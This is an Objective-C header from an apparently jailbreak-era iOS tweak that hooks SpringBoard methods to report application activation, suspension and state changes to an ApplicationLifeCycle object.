//
//  ALC.h
//  MSFSP
//
//  Created by Makara Khloth on 9/18/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "SBApplicationController.h"
#import "SBApplication+IOS6.h"

#import "ApplicationLifeCycle.h"

HOOK(SBApplicationController, applicationStateChanged$state$, void, id arg1, unsigned int arg2) {
	DLog (@"applicationStateChanged$state$ arg1 = %@, arg2 = %d", arg1, arg2);
	
	CALL_ORIG(SBApplicationController, applicationStateChanged$state$, arg1, arg2);
	
	ApplicationLifeCycle *alc = [ApplicationLifeCycle sharedALC];
	
	//[alc applicationStateChanged:arg1 state:arg2];
	
	NSDictionary *appInfo = [NSDictionary dictionaryWithObjectsAndKeys:arg1, @"SBApplication",
												[NSNumber numberWithInt:arg2], @"state", nil];
	[alc performSelector:@selector(applicationStateChanged:) withObject:appInfo afterDelay:0.0];
}

#pragma mark -
#pragma mark -IOS 6 for launch, stop
#pragma mark -

HOOK(SBApplication, didSuspend, void) {
	DLog (@"================================= HOOK didSuspend=================================");
	
	CALL_ORIG(SBApplication, didSuspend);
	
	ApplicationLifeCycle *alc = [ApplicationLifeCycle sharedALC];
	
	NSDictionary *appInfo = [NSDictionary dictionaryWithObjectsAndKeys:self, @"SBApplication",
							 [NSNumber numberWithInt:3], @"state", nil]; // Why number 3? more details in ApplicationLifeCycle class
	[alc performSelector:@selector(applicationStateChanged:) withObject:appInfo afterDelay:0.0];
}

HOOK(SBApplication, didActivate, void) {
	DLog (@"================================= HOOK didActivate=================================");
	
	CALL_ORIG(SBApplication, didActivate);
	
	ApplicationLifeCycle *alc = [ApplicationLifeCycle sharedALC];
	
	NSDictionary *appInfo = [NSDictionary dictionaryWithObjectsAndKeys:self, @"SBApplication",
							 [NSNumber numberWithInt:4], @"state", nil]; // Why number 3? more details in ApplicationLifeCycle class
	[alc performSelector:@selector(applicationStateChanged:) withObject:appInfo afterDelay:0.0];
}